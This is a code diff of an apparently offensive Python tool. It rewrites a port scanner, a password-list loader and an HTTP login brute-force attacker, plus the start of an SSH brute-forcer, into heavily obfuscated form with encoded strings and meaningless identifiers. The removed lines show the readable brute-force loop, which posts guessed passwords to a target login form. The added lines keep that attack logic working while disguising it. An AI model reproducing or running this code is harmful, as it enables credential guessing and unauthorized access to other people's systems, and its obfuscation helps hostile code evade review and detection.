+                        IIllIlIIlIllIIIIIlIIlI = {0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('38'), 16) * 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 216) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('ea'), 16) + 0 .__class__((lambda n: int.__xor__(n, 50).to_bytes(1, 'big').decode())(7), 16): (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 140) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('cad8dc'), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 29)) for IlIlIllIlIIlIlllI in x)))([44]), 16) << 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 24)) for IlIlIllIlIIlIlllI in x)))([44]), 16) | 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 3)) for IlIlIllIlIIlIlllI in x)))([53]), 16): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('485353'), 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 112) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('1240'), 16) - 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3939'), 16): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 63)) for IlIlIllIlIIlIlllI in x)))([107, 90, 83, 81, 90, 75]), 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('34'), 16) * 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 34)) for IlIlIllIlIIlIlllI in x)))([20]), 16) + 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 236 for IlIlIIlIlIllllI in x[::-1]]).decode())([221]), 16): (lambda n: int.__xor__(n, 1834802683).to_bytes(4, 'big').decode())(1041336747), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 50)) for IlIlIllIlIIlIlllI in x)))([3, 115]), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 56114).to_bytes(2, 'big').decode())(59732), 16): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 109 for IlIlIIlIlIllllI in x[::-1]]).decode())([62, 35, 41]), 0 .__class__((lambda n: int.__xor__(n, 81).to_bytes(1, 'big').decode())(100), 16) << 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 57)) for IlIlIllIlIIlIlllI in x)))([13]), 16) | 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 108 for IlIlIIlIlIllllI in x[::-1]]).decode())([92]), 16): (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 171) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e3fffffb'), 0 .__class__((lambda n: int.__xor__(n, 15542).to_bytes(2, 'big').decode())(3572), 16) << 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('32'), 16) | 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 34) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('10'), 16): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 100 for IlIlIIlIlIllllI in x[::-1]]).decode())([87, 52, 43, 52]), 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 120) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('48'), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 56074).to_bytes(2, 'big').decode())(58188), 16): (lambda n: int.__xor__(n, 2241393066).to_bytes(4, 'big').decode())(3436556538), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 71)) for IlIlIllIlIIlIlllI in x)))([116]), 16) * 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 28) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('252f'), 16) + 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('32'), 16): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('5350545448'), 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('63623931'), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 2392736701).to_bytes(4, 'big').decode())(3215621004), 16): (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 96) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('322430')}.get(port, (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 181) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e0dbdedbdac2db'))
+                        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 221845660227).to_bytes(5, 'big').decode())(291342732343)](f'{Fore.GREEN}[+] Port {port} ({IIllIlIIlIllIIIIIlIIlI}): OPEN')
+                        lIlIlIIlllllIIlIIIl.append(port)
                     sock.close()
                 except Exception as e:
-                    if 'sock' in locals():
+                    if (lambda n: int.__xor__(n, 2602735203).to_bytes(4, 'big').decode())(3897423112) in lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 32) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('4c4f43414c53')]():
                         sock.close()
                     continue
         except Exception as e:
-            print(f"{Fore.RED}[-] Error during port scan: {e}")
-        
-        if not open_ports:
-            print(f"{Fore.RED}[-] No open ports found")
-        return open_ports
+            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 369565370758).to_bytes(5, 'big').decode())(165250951154)](f'{Fore.RED}[-] Error during port scan: {e}')
+        if not lIlIlIIlllllIIlIIIl:
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] No open ports found')
+        return lIlIlIIlllllIIlIIIl
 
     @staticmethod
-    def host_to_ip(hostname):
-        """Resolve hostname to IP address"""
+    def IllIIlIIIlIlIIlIllllI(hostname):
         try:
-            ip = socket.gethostbyname(hostname)
-            print(f"{Fore.GREEN}[+] {hostname} -> {ip}")
-            return ip
+            lIlIllIlllIl = IllllIllIllIl(hostname)
+            lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 19 for IlIlIIlIlIllllI in x[::-1]]).decode())([103, 125, 122, 97, 99])](f'{Fore.GREEN}[+] {hostname} -> {lIlIllIlllIl}')
+            return lIlIllIlllIl
         except:
-            print(f"{Fore.RED}[-] Could not resolve hostname: {hostname}")
+            lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 59)) for IlIlIllIlIIlIlllI in x)))([75, 73, 82, 85, 79])](f'{Fore.RED}[-] Could not resolve hostname: {hostname}')
             return None
 
     @staticmethod
-    def nmap_scan(ip):
-        """Fixed Nmap scan with proper error handling"""
-        # Validate IP
+    def llIIIIIIIllIIlIlllllIIIII(lIlIllIlllIl):
         try:
-            socket.inet_aton(ip)
+            llIIlllllllIIlIlI(lIlIllIlllIl)
         except socket.error:
-            print(f"{Fore.RED}[-] Invalid IP address!")
+            lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 131 for IlIlIIlIlIllllI in x[::-1]]).decode())([247, 237, 234, 241, 243])](f'{Fore.RED}[-] Invalid IP address!')
             return []
-            
         try:
-            print(f"{Fore.CYAN}[+] Performing Nmap-like scan on {ip}...")
-            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5900, 8080, 8443]
-            open_ports = []
-            
-            for port in common_ports:
+            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 556746579961).to_bytes(5, 'big').decode())(1038623437197)](f'{Fore.CYAN}[+] Performing Nmap-like scan on {lIlIllIlllIl}...')
+            IllIlllIIIllIIIllllIIl = [0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('453131'), 16) - 0 .__class__((lambda n: int.__xor__(n, 14770726).to_bytes(3, 'big').decode())(13652511), 16), 0 .__class__((lambda n: int.__xor__(n, 33).to_bytes(1, 'big').decode())(21), 16) * 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 62) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('0b'), 16) + 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 175) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('9d'), 16), 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('42'), 16) << 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 120)) for IlIlIllIlIIlIlllI in x)))([73]), 16) | 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 115) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('42'), 16), 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('63'), 16) << 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 66) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('73'), 16) | 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 18) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('23'), 16), 0 .__class__((lambda n: int.__xor__(n, 118).to_bytes(1, 'big').decode())(66), 16) * 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('64'), 16) + 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 247) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('c6'), 16), 0 .__class__((lambda n: int.__xor__(n, 52056).to_bytes(2, 'big').decode())(36200), 16) ^ 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 236) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('8ddc'), 16), 0 .__class__((lambda n: int.__xor__(n, 34).to_bytes(1, 'big').decode())(23), 16) * 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3631'), 16) + 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 46)) for IlIlIllIlIIlIlllI in x)))([30]), 16), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 115)) for IlIlIllIlIIlIlllI in x)))([54, 66]), 16) ^ 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('4536'), 16), 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 217) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e8eb9b'), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 126)) for IlIlIllIlIIlIlllI in x)))([71, 78]), 16), 0 .__class__((lambda n: int.__xor__(n, 47530).to_bytes(2, 'big').decode())(57234), 16) << 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 109)) for IlIlIllIlIIlIlllI in x)))([95]), 16) | 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 116 for IlIlIIlIlIllllI in x[::-1]]).decode())([69]), 16), 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 220) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e9'), 16) * 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 117 for IlIlIIlIlIllllI in x[::-1]]).decode())([66, 22]), 16) + 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('30'), 16), 0 .__class__((lambda n: int.__xor__(n, 986).to_bytes(2, 'big').decode())(13805), 16) << 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('35'), 16) | 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 124) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('3d'), 16), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 104)) for IlIlIllIlIIlIlllI in x)))([11, 9, 91]), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 8903182).to_bytes(3, 'big').decode())(11985771), 16), 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 164) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('959c9690'), 16) - 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 217) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e8e8e1'), 16), 0 .__class__((lambda n: int.__xor__(n, 211).to_bytes(1, 'big').decode())(229), 16) * 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 35)) for IlIlIllIlIIlIlllI in x)))([22, 23, 17]), 16) + 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 34)) for IlIlIllIlIIlIlllI in x)))([22]), 16), 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 86 for IlIlIIlIlIllllI in x[::-1]]).decode())([16, 103, 98]), 16) << 0 .__class__((lambda n: int.__xor__(n, 19).to_bytes(1, 'big').decode())(32), 16) | 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('33'), 16)]
+            lIlIlIIlllllIIlIIIl = []
+            for port in IllIlllIIIllIIIllllIIl:
                 try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(0.5)
-                    result = sock.connect_ex((ip, port))
-                    if result == 0:
-                        service = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
-                                  80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 3389: "RDP"}.get(port, "Unknown")
-                        print(f"{Fore.GREEN}[+] Port {port} ({service}): OPEN")
-                        open_ports.append(port)
+                    sock = lIllIlIIlIIlIIIlllIlIll(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout((0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 37)) for IlIlIllIlIIlIlllI in x)))([21]), 16) << 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 155 for IlIlIIlIlIllllI in x[::-1]]).decode())([170]), 16) | 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 108 for IlIlIIlIlIllllI in x[::-1]]).decode())([93]), 16)) / (0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('313731'), 16) - 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 87) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('666111'), 16)))
+                    llIIlIllIlIl = sock.connect_ex((lIlIllIlllIl, port))
+                    if llIIlIllIlIl == 0 .__class__((lambda n: int.__xor__(n, 46043).to_bytes(2, 'big').decode())(62106), 16) ^ 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 169 for IlIlIIlIlIllllI in x[::-1]]).decode())([232, 232]), 16):
+                        IIllIlIIlIllIIIIIlIIlI = {0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 82) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('633060'), 16) - 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 102)) for IlIlIllIlIIlIlllI in x)))([87, 95, 34]), 16): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 174 for IlIlIIlIlIllllI in x[::-1]]).decode())([254, 250, 232]), 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('37'), 16) * 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 22)) for IlIlIllIlIIlIlllI in x)))([37]), 16) + 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 129 for IlIlIIlIlIllllI in x[::-1]]).decode())([176]), 16): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 113)) for IlIlIllIlIIlIlllI in x)))([34, 34, 57]), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 89)) for IlIlIllIlIIlIlllI in x)))([104, 108, 59]), 16) - 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 84)) for IlIlIllIlIIlIlllI in x)))([101, 96, 96]), 16): (lambda n: int.__xor__(n, 74601808392664).to_bytes(6, 'big').decode())(26100418188460), 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 44 for IlIlIIlIlIllllI in x[::-1]]).decode())([26, 30]), 16) ^ 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6633'), 16): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 22 for IlIlIIlIlIllllI in x[::-1]]).decode())([70, 66, 91, 69]), 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 63 for IlIlIIlIlIllllI in x[::-1]]).decode())([91]), 16) << 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('32'), 16) | 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 124) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('4d'), 16): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 5)) for IlIlIllIlIIlIlllI in x)))([65, 75, 86]), 0 .__class__((lambda n: int.__xor__(n, 62536).to_bytes(2, 'big').decode())(38699), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 29)) for IlIlIllIlIIlIlllI in x)))([36, 126]), 16): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 4)) for IlIlIllIlIIlIlllI in x)))([76, 80, 80, 84]), 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 192 for IlIlIIlIlIllllI in x[::-1]]).decode())([242, 244]), 16) ^ 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 196 for IlIlIIlIlIllllI in x[::-1]]).decode())([135, 246]), 16): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('33504f50'), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 127)) for IlIlIllIlIIlIlllI in x)))([29]), 16) * 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 134 for IlIlIIlIlIllllI in x[::-1]]).decode())([226]), 16) + 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 111 for IlIlIIlIlIllllI in x[::-1]]).decode())([95]), 16): (lambda n: int.__xor__(n, 3193444189).to_bytes(4, 'big').decode())(4145370637), 0 .__class__((lambda n: int.__xor__(n, 11803142).to_bytes(3, 'big').decode())(8805940), 16) - 0 .__class__((lambda n: int.__xor__(n, 890931).to_bytes(3, 'big').decode())(3975428), 16): (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('5350545448'), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 117)) for IlIlIllIlIIlIlllI in x)))([76]), 16) * 0 .__class__((lambda n: int.__xor__(n, 8176475).to_bytes(3, 'big').decode())(5108835), 16) + 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 223 for IlIlIIlIlIllllI in x[::-1]]).decode())([234]), 16): (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 68)) for IlIlIllIlIIlIlllI in x)))([22, 0, 20])}.get(port, (lambda n: int.__xor__(n, 3610508827078808).to_bytes(7, 'big').decode())(25260001735460854))
+                        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 82) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('22203b3c26')](f'{Fore.GREEN}[+] Port {port} ({IIllIlIIlIllIIIIIlIIlI}): OPEN')
+                        lIlIlIIlllllIIlIIIl.append(port)
                     sock.close()
                 except Exception as e:
-                    if 'sock' in locals():
+                    if (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 1)) for IlIlIllIlIIlIlllI in x)))([114, 110, 98, 106]) in lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('736c61636f6c')]():
                         sock.close()
                     continue
-            
-            if not open_ports:
-                print(f"{Fore.RED}[-] No common ports found open")
-            return open_ports
+            if not lIlIlIIlllllIIlIIIl:
+                lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 102) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('16140f0812')](f'{Fore.RED}[-] No common ports found open')
+            return lIlIlIIlllllIIlIIIl
         except Exception as e:
-            print(f"{Fore.RED}[-] Error during Nmap scan: {e}")
+            lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 129 for IlIlIIlIlIllllI in x[::-1]]).decode())([245, 239, 232, 243, 241])](f'{Fore.RED}[-] Error during Nmap scan: {e}')
             return []
 
-# --- PASSWORD ATTACKS ---
-class PasswordAttacks:
+class IlIlllIlIIlIlIll:
+
     @staticmethod
-    def load_passwords_from_file(filename):
-        """Load passwords from a text file"""
+    def IIIIIlIIIlIIl(lIIllllllIIIlIIllIIlIIlll):
         passwords = []
         try:
-            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
-                passwords = [line.strip() for line in f if line.strip()]
-            print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords from {filename}")
+            with lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 210) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('bda2b7bc')](lIIllllllIIIlIIllIIlIIlll, (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 115) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('01'), encoding=(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 210) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a7a6b4ffea'), errors=(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 68)) for IlIlIllIlIIlIlllI in x)))([45, 35, 42, 43, 54, 33])) as llIllIllllIIlIlIIIIIIlI:
+                passwords = [llIIIIIIlIIIlIIIll.strip() for llIIIIIIlIIIlIIIll in llIllIllllIIlIlIIIIIIlI if llIIIIIIlIIIlIIIll.strip()]
+            lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 15641247399).to_bytes(5, 'big').decode())(497513861331)](f"{Fore.GREEN}[+] Loaded {lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 245) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('99909b')](passwords)} passwords from {lIIllllllIIIlIIllIIlIIlll}")
         except FileNotFoundError:
-            print(f"{Fore.RED}[-] Password file {filename} not found")
+            lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 220 for IlIlIIlIlIllllI in x[::-1]]).decode())([168, 178, 181, 174, 172])](f'{Fore.RED}[-] Password file {lIIllllllIIIlIIllIIlIIlll} not found')
             return []
         except Exception as e:
-            print(f"{Fore.RED}[-] Error loading passwords: {e}")
+            lIlIIIIllllIlIlIII[(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 15)) for IlIlIllIlIIlIlllI in x)))([127, 125, 102, 97, 123])](f'{Fore.RED}[-] Error loading passwords: {e}')
             return []
         return passwords
-    
-    @staticmethod
-    def http_bruteforce(url, username):
-        """HTTP form bruteforce attack with custom password file option"""
-        print(f"{Fore.CYAN}[+] Starting HTTP bruteforce on {url}")
-        print(f"{Fore.CYAN}[+] Target user: {username}")
-        
-        # Ask user if they want to use custom password file
-        use_custom = input(f"{Fore.CYAN}Use custom password file? (y/n, default n): {Fore.WHITE}").lower()
-        passwords = PASSWORD_LIST
-        
-        if use_custom == 'y':
-            filename = input(f"{Fore.CYAN}Enter password file name: {Fore.WHITE}")
-            custom_passwords = PasswordAttacks.load_passwords_from_file(filename)
-            if custom_passwords:
-                passwords = custom_passwords
-            else:
-                print(f"{Fore.YELLOW}[!] Using default password list")
-        
-        for password in passwords:
-            try:
-                print(f"{Fore.YELLOW}[?] Trying: {password}", end='\r')
-                response = requests.post(url, data={'username': username, 'password': password}, timeout=3)
-                if "dashboard" in response.text.lower() or response.status_code == 302:
-                    print(f"{Fore.GREEN}[!] SUCCESS! Password found: {password}")
-                    return
-            except Exception as e:
-                print(f"{Fore.RED}[-] Request error: {e}")
-                continue
-        
-        print(f"{Fore.RED}[-] Password not found in wordlist")
 
     @staticmethod
-    def ssh_bruteforce(host, username):
-        """SSH bruteforce attack with custom password file option"""
+    def lllIIIlIIIllllIIl(llIIIIIIIllIIIIIlIllllII, username):
+        lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 84 for IlIlIIlIlIllllI in x[::-1]]).decode())([32, 58, 61, 38, 36])](f'{Fore.CYAN}[+] Starting HTTP bruteforce on {llIIIIIIIllIIIIIlIllllII}')
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 768559605673).to_bytes(5, 'big').decode())(835435203037)](f'{Fore.CYAN}[+] Target user: {username}')
+        llIlIIlIIIIIlIllIlIIlIIlII = lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 180) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('dddac4c1c0')](f'{Fore.CYAN}Use custom password file? (y/n, default n): {Fore.WHITE}').lower()
+        passwords = IIllIllIIllI
